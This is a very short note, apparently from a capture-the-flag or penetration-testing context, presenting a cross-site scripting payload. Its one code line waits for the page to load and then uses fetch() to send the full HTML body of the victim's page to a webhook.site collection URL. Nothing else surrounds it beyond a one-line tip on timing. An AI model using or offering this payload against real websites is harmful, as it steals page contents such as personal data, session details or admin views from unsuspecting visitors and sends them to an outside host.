Simple XSS just be careful that the page loads before we send off the body, for example:

```html
<script> window.onload = () => fetch('https://webhook.site/<ID>?page='+encodeURIComponent(document.body.innerHTML)) </script>
```
